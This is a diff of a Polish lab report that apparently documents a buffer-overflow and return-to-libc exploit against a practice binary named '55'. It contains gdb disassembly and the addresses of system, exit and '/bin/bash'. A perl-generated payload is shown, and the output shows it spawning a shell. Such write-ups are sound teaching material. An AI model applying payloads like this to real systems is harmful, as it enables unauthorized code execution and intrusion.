@@ -207,18 +207,18 @@ Do osiągnięcia celu zostały podjęte kolejne kroki:
       Debuggując program, można go znaleźć w funkcji `validate`, bo jest tam wyświetlany.
 
       Fragment funkcji `validate`:
-	  
-	  ```
-      0x080485e9 <+18>:	mov    0x804a030,%eax
-   	  0x080485ee <+23>:	mov    %eax,(%esp)
-      0x080485f1 <+26>:	call   0x80484b4 <puts@plt>
+      
+      ```
+      0x080485e9 <+18>: mov    0x804a030,%eax
+      0x080485ee <+23>: mov    %eax,(%esp)
+      0x080485f1 <+26>: call   0x80484b4 <puts@plt>
       ```
       
       Sprawdzenie adresu tesktu:
 
       `p/s *0x804a030`
       
-      >0x80487d0:	"/bin/bash"
+      >0x80487d0:   "/bin/bash"
 
    - Adres funkcji `system`.
    
@@ -234,22 +234,21 @@ Do osiągnięcia celu zostały podjęte kolejne kroki:
    - 4 bajty adresu funkcji `system`: 0x08048454
    - 4 bajty adresu tesktu "bin/bash": 0x080487d0
    - 4 bajty adresu funkcji exit: 0x080484d4
-   - 4 bajty zerowe (exit): 0x00000000
 
    ```bash
-   gdb --args 55 `perl -e 'print "1"x67 . "\x54\x84\x04\x08" . "\xd0\x87\x04\x08" . "\xd4\x84\x04\x08" . "\x0\x0\x0\x0"'`
+   ./55 `perl -e 'print "1"x67 . "\x54\x84\x04\x08" . "\xd4\x84\x04\x08" . "\xd0\x87\x04\x08" . "\x0\x0\x0\x0"'`
    ```
-
 
    Program zakończył się pomyślnie:
    
     ```
-   (gdb) r
-	Starting program: /workspace/55 1111111111111111111111111111111111111111111111111111111111111111111�
-	warning: Error disabling address space randomization: Operation not permitted
-	To continue you must provide security access token (21 digits)
-	sh: 1: ��������������������U��]Ít: not found
-	During startup program exited normally.
+    root@7369972b675e:/workspace# ./55 `perl -e 'print "1"x67 . "\x54\x84\x04\x08" . "\xd4\x84\x04\x08" . "\xd0\x87\x04\x08" . "\x0\x0\x0\x0"'`
+    To continue you must provide security access token (21 digits)
+    root@7369972b675e:/workspace# echo hania
+    hania
+    root@7369972b675e:/workspace# exit
+    exit
+    root@7369972b675e:/workspace#
     ```
 
 
@@ -265,7 +264,7 @@ Zadanie wymagało zrozumienia sekwencji odwołań do adresów w pamięci i struk
 
 <!-- Lab4
 
-	NOTATKI Z ZAJĘĆ
+    NOTATKI Z ZAJĘĆ
 
 na początku jest zmienna lokalna duża
 wywołanie: strcpy(ta zmienna lokalna, argument funkcji validate)
